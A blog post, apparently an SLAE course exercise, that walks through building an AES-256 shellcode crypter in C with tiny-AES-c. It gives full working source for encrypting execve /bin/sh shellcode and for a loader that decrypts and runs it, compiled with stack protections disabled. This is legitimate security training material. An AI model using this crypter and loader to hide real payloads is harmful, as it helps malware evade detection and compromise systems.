---
layout: post
title: SLAE 7 - Custom Crypter - AES256 in C
date:   2019-03-07
categories: [SLAE, Assembly]
---
The last challenge is to create a custom crypter.  

First thing that comes to mind as far as symmetric encryption is AES so I'll go ahead and try that.

Googling around looking for an implementation for AES in C comes up quickly with the "tiny-AES-c" github page at:

[https://github.com/kokke/tiny-AES-c](https://github.com/kokke/tiny-AES-c)

This is perfect for this so that we don't have to do any heavy lifting here.  All that needs to be done is a few calls to the already written functions and we're set.  This even allows AES128, AES192, and AES256.

Looking at the header files in aes.h, we want to use AES256, a 32 byte key, which means we will need to define aes256 and comment out the aes128 at line 26.
```c
//#define AES128 1
//#define AES192 1
#define AES256 1
```
There is also a mention that, in order to specify the mode, we will need to define the mode constants before the include if we want to take advantage of that option. If not, all modes are defined and available for use.
```c
// #define the macros below to 1/0 to enable/disable the mode of operation.
//
// CBC enables AES encryption in CBC-mode of operation.
// CTR enables encryption in counter-mode.
// ECB enables the basic ECB 16-byte block algorithm. All can be enabled simultaneously.

// The #ifndef-guard allows it to be configured before #include'ing or at compile time.
#ifndef CBC
  #define CBC 1
#endif

#ifndef ECB
  #define ECB 1
#endif

#ifndef CTR
  #define CTR 1
#endif
```
The implementation uses stdint so we will take advantage of that as well specifying unsigned integers and their size.  For example, uint8_t gives us an 8 bit unsigned integer which is perfect for a bytearray.  

Since we are using CBC mode, lets take a look at the function declarations that we will be using.

CBC uses an initialization vector so we will need to set that.  One nice thing about this implementation is there is the option to set the IV and the context in 1 call - AES_init_ctx_iv.  If needed, you can initialize them in separate calls as well but we don't need to do that here.
```c
void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);
#if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);
void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);
#endif
```
Then, we will just need to properly call encrypt and decrypt.
```c
#if defined(CBC) && (CBC == 1)
// buffer size MUST be mutile of AES_BLOCKLEN;
// Suggest https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme
// NOTES: you need to set IV in ctx via AES_init_ctx_iv() or AES_ctx_set_iv()
//        no IV should ever be reused with the same key 
void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, uint32_t length);
void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, uint32_t length);

#endif // #if defined(CBC) && (CBC == 1)
```
So let's build main.. The course video example allows the user to provide the key through input instead of hardcoding it.. So I will go ahead and do that as well.  First thing, just check the length of the key and make sure its 32 bytes.  Then we will need to prepare for our encrypt call.  We need to initialize the context and iv, then call encrypt which takes ctx, buffer, and length.

The shellcode length will be sizeof(sc)-1 so we ignore the null terminating byte at the end.  We will just specify uint32_t for the length variable.  For my own debugging, I'm going to add a piece that will output the original shellcode then the encrypted shellcode in order to see the differences.

Next we will call our own encrypt function that will take the key and length of the shellcode in order to initialize the IV and context, then call tinyAES' encrypt function.

In order to print the new encrypted shellcode, I'm going to need to calculate the length of the cipher text which will probably include some padding.  Googling for an easy way to calculate this, I came across:

[https://crypto.stackexchange.com/questions/54017/can-we-calculate-aes-ciphertext-length-based-on-the-length-of-the-plaintext](https://crypto.stackexchange.com/questions/54017/can-we-calculate-aes-ciphertext-length-based-on-the-length-of-the-plaintext)

Next, we output the newly encrypted shellcode which will go into our decrypt/run program.
```c
main(int argc, char* argv[]{
  
  // check length of key
  if(strlen(argv[1]) != 32){
    printf("Make the key 32 bytes.");
    return 0;
  }
  
  char *encryptKey = argv[1];
  uint32_t sc_len = sizeof(sc)-1;
  
  printf("Orig Shellcode:\n");
	for(int i = 0; i < sc_len; i++)
	{
		printf("\\x%02X", sc[i]);

	}
	printf("\n\n");

	encrypt(encryptKey, sc_len);
  
  uint32_t enc_sc_len = sc_len + (16 - (sc_len % 16));    // calculate ciphertext length
  
  printf("Encrypted Shellcode:\n");

	for(int i = 0; i < enc_sc_len; i++)
	{
		printf("\\x%02X", sc[i]);

	}	
	printf("\n");

	return 0;
}
```
Now we can use this and create the encrypt function.

The encrypt call for tiny-AES does not return anything so it encrypts the buffer that is passed in.  We can make this function:

void encrypt(char* encryptKey, uint32_t length).

First we should initialize what we need in order to make our AES calls. Which includes context, struct AES_ctx ctx, and the IV.

Since this is just a PoC we will just hardcode an IV and get it to work.  Now that we have everything initialized, we call our context and IV initialization function then the encrypt buffer call.
```c
void encrypt(char* encryptKey, uint32_t length){
  struct AES_ctx ctx;
  char* iv = "a83lLkdfndi20did";
  
  AES_init_ctx_iv(&ctx, (uint8_t*)encryptKey, (uint8_t*)iv);
  
  AES_CBC_encrypt_buffer(&ctx, sc, length);
}
```
Let's put it together and add our start of the file which will add the includes, defines, and our global variable -- the shellcode we will be encrypting.  We will use the execve-stack shellcode from the course content.
```c
#include <stdio.h>
#include <stdint.h>	// uint8_t for shellcode, key, and iv
#include <string.h>	// strlen

#define CBC 1
#define ECB 0
#define CTR 0

#include "aes.h"	// tiny AES

uint8_t sc[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

void encrypt(char* encryptKey, uint32_t length)
{

	struct AES_ctx ctx;
	char *iv = "a83lLkdfndi20did";
 
	AES_init_ctx_iv(&ctx, (uint8_t*)encryptKey,(uint8_t*)iv);

	AES_CBC_encrypt_buffer(&ctx, sc, length);

}

main(int argc, char* argv[])
{
	while(strlen(argv[1]) != 32){
		printf("Make the key 32 bytes");
		return 0;
	}
	char *encryptKey = argv[1];
	uint32_t sc_len = sizeof(sc)-1;

	printf("Orig Shellcode:\n");
	for(int i = 0; i < sc_len; i++)
	{
		printf("\\x%02X", sc[i]);

	}
	printf("\n\n");

	encrypt(encryptKey, sc_len);
	
	uint32_t enc_sc_len = sc_len + (16 - (sc_len % 16));

	printf("Encrypted Shellcode:\n");

	for(int i = 0; i < enc_sc_len; i++)
	{
		printf("\\x%02X", sc[i]);

	}	
	printf("\n");

	return 0;
}
```
Let's compile it and run it.. We need to compile our aes implementation also so that we can have it included in our final product.
```
gcc -c -o aes.o aes.c
gcc aes_256_crypter.c aes.o aes.h -o aes_256_crypter
aes_256_crypter.c:30:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
 main(int argc, char* argv[])
 ^
```
Let's run it with a key as input to make sure it works..
```
./aes_256_crypter securitytube-key-012345678901234
Orig Shellcode:
\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x89\xE2\x53\x89\xE1\xB0\x0B\xCD\x80

Encrypted Shellcode:
\xAF\x5B\x25\x46\x1C\xE4\x84\x94\xFC\x0F\x32\xDF\x9C\x31\x5D\x2D\xDA\xEF\x55\xC9\x8F\x56\x1F\xC1\x9C\x0C\x3B\x3A\x21\x0D\x61\xD3
```
Now that we have working encryption, it is time to create the program that decrypts the shellcode and passes execution to the unencrypted shellcode so that our execve-stack payload is run.

This will be very similar to our encryption we will just call the decrypt function instead.

First we add our defines, includes, and the encrypted shellcode which were all explained in the encryption program.

Our decrypt functino will take the key and length, same as the encrypt function.  We will initialize the context and initialization vector with AES_init_ctx_iv and then call AES_CBC_decrypt_buffer.

Our variable initializations are the same, struct AES_ctx ctx.. and the IV which we hardcoded so it will be the same.

In the main function, we will check the key length then we will create our call for the shellcode in order to prepare for the hand off to our decrypted shellcode. This will be int (*ret)() = (int(*)())enc_sc;

The rest of main is pretty straight forward.  The decrypt function we created is called then output the decrypted shellcode for debugging purposes. Next, ret() is called which is the hand off to our decrypted shellcode.  If properly done, we should have a new shell prompt!
```c
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define CBC 1
#define ECB 0
#define CTR 0

#include "aes.h"

uint8_t enc_sc[] = "\xAF\x5B\x25\x46\x1C\xE4\x84\x94\xFC\x0F\x32\xDF\x9C\x31\x5D\x2D\xDA\xEF\x55\xC9\x8F\x56\x1F\xC1\x9C\x0C\x3B\x3A\x21\x0D\x61\xD3";

void decrypt(char *decryptKey, uint32_t length)
{
	struct AES_ctx ctx;
	char *iv = "a83lLkdfndi20did";
	
	AES_init_ctx_iv(&ctx, (uint8_t*)decryptKey, (uint8_t*)iv);
	
	AES_CBC_decrypt_buffer(&ctx, enc_sc, length);
}

main(int argc, char* argv[])
{
	if(strlen(argv[1]) != 32){
    printf("Make the key 32 bytes");
    return 0;
  }	

	int (*ret)() = (int(*)())enc_sc;
	char *decryptKey = argv[1];
  uint32_t sc_len = sizeof(enc_sc)-1;

	decrypt(decryptKey, sc_len);
	
	printf("Decrypted Shellcode:\n");

	for(int i = 0; i < sc_len; i++)
	{
		printf("\\x%02X", enc_sc[i]);

	}	
	printf("\n");	

	printf("Running Shellcode.\n\n\n");

	ret();

	printf("\n\n");

	return 1;
}
```
Since we are running the execve-stack shellcode, we will need to compile this with the usual options when we tested shellcode in previous write-ups.. no stack protector and execstack.
```
gcc -fno-stack-protector -z execstack execute_encrypted_payload.c aes.o aes.h -o execute_encrypted_payload
execute_encrypted_payload.c:23:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
 main(int argc, char* argv[])
 ^
```
Run it with the same key as input
```
./execute_encrypted_payload securitytube-key-012345678901234
Decrypted Shellcode:
\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x89\xE2\x53\x89\xE1\xB0\x0B\xCD\x80\x00\x00\x00\x00\x00\x00\x00
Running Shellcode.


$ who
pwoer    tty7         Feb 28 14:13 (:0)
$ 
```
We now have a working crypter!
